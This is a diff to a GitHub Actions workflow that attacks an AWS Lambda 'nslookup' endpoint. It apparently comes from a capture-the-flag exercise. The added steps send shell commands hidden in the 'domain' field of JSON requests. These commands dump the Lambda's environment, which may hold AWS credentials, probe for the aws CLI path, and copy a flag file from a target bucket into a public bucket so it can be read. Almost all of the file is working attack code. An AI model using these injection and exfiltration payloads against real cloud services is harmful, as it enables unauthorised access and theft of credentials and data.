@@ -20,79 +20,48 @@ jobs:
       - name: AWS identity
         run: aws sts get-caller-identity
 
-      # ===== Original plan: trigger via API Gateway + read CloudWatch =====
-
-      - name: Trigger nslookup via API Gateway
+      - name: Step 1 - Verify lambda is invoked and find aws CLI path
         run: |
-          echo "===== TRIGGERING LAMBDA VIA API GATEWAY ====="
-          curl -s -i -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup" \
+          echo "===== TEST: write env output to public bucket ====="
+          # If this appears in platform-bucket, lambda IS being invoked (not MOCK)
+          # and we learn: PATH, AWS credentials available to lambdaRole, aws CLI location
+          curl -s -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup" \
             -H "Content-Type: application/json" \
-            -d '{"domain":"example.com; aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt && cat /tmp/flag.txt"}'
+            -d '{"domain":"x; env | aws s3 cp - s3://platform-bucket-009661764077-us-east-1/env_dump.txt 2>&1 | aws s3 cp - s3://platform-bucket-009661764077-us-east-1/env_err.txt"}'
 
-      - name: Wait for logs to propagate
-        run: sleep 8
-
-      - name: List recent log streams
-        continue-on-error: true
+      - name: Step 2 - Also try explicit aws paths in case not in PATH
         run: |
-          echo "===== LOG STREAMS ====="
-          aws logs describe-log-streams \
-            --log-group-name /aws/lambda/nslookupv2 \
-            --order-by LastEventTime --descending --limit 5
+          echo "===== TEST: try known aws CLI paths ====="
+          for AWS_PATH in "aws" "/opt/bin/aws" "/opt/aws/bin/aws" "/var/lang/bin/aws"; do
+            curl -s -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup" \
+              -H "Content-Type: application/json" \
+              -d "{\"domain\":\"x; echo $AWS_PATH > /tmp/p.txt && $AWS_PATH s3 cp /tmp/p.txt s3://platform-bucket-009661764077-us-east-1/awspath_${AWS_PATH//\//_}.txt\"}"
+            sleep 1
+          done
 
-      - name: Get log events from most recent stream
-        continue-on-error: true
+      - name: Wait for lambda executions to complete
+        run: sleep 15
+
+      - name: Step 3 - Check what appeared in public bucket
         run: |
-          echo "===== LOG EVENTS ====="
-          STREAM=$(aws logs describe-log-streams \
-            --log-group-name /aws/lambda/nslookupv2 \
-            --order-by LastEventTime --descending --limit 1 \
-            --query 'logStreams[0].logStreamName' --output text)
-          echo "Stream: $STREAM"
-          aws logs get-log-events \
-            --log-group-name /aws/lambda/nslookupv2 \
-            --log-stream-name "$STREAM" \
-            --query 'events[*].message' --output text
+          echo "===== CHECK: env dump ====="
+          curl -s "https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/env_dump.txt"
+          echo ""
+          echo "===== CHECK: error output ====="
+          curl -s "https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/env_err.txt"
+          echo ""
+          echo "===== CHECK: which aws path worked ====="
+          for AWS_PATH in "aws" "opt_bin_aws" "opt_aws_bin_aws" "var_lang_bin_aws"; do
+            echo "--- $AWS_PATH ---"
+            curl -s "https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/awspath_${AWS_PATH}.txt"
+          done
 
-      # ===== New: Control Plane checks (untested) =====
-
-      - name: Try updating Lambda function configuration
-        continue-on-error: true
+      - name: Step 4 - If tests passed, grab the actual flag
         run: |
-          echo "===== UPDATE FUNCTION CONFIGURATION (env vars test) ====="
-          aws lambda update-function-configuration \
-            --function-name nslookupv2 \
-            --environment "Variables={PROBE=test}"
-
-      - name: Try updating API Gateway integration
-        continue-on-error: true
-        run: |
-          echo "===== PUT INTEGRATION on /dev/nslookup ====="
-          aws apigateway put-integration \
-            --rest-api-id 3q931syi7b \
-            --resource-id dummy \
-            --http-method POST \
-            --type AWS_PROXY \
-            --integration-http-method POST \
-            --uri "arn:aws:apigateway:us-east-1:lambda:path/2015-03-31/functions/arn:aws:lambda:us-east-1:009661764077:function:nslookupv2/invocations"
-
-      # ===== New: Blind indirect event-source triggers (untested) =====
-
-      - name: Try uploading a marker object to trigger possible S3 event
-        continue-on-error: true
-        run: |
-          echo "===== BLIND S3 PUT (in case of unseen event notification) ====="
-          echo "probe" > /tmp/probe.txt
-          aws s3 cp /tmp/probe.txt s3://codec4f26c862a321ef5/probe.txt
-
-      - name: Check for SNS topics
-        continue-on-error: true
-        run: |
-          echo "===== SNS TOPICS ====="
-          aws sns list-topics
-
-      - name: Check for SQS queues
-        continue-on-error: true
-        run: |
-          echo "===== SQS QUEUES ====="
-          aws sqs list-queues
+          echo "===== FINAL: copy flag to public bucket ====="
+          curl -s -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup" \
+            -H "Content-Type: application/json" \
+            -d '{"domain":"x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/flag_exfil.txt"}'
+          sleep 10
+          echo "===== FLAG ====="
+          curl -s "https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/flag_exfil.txt"
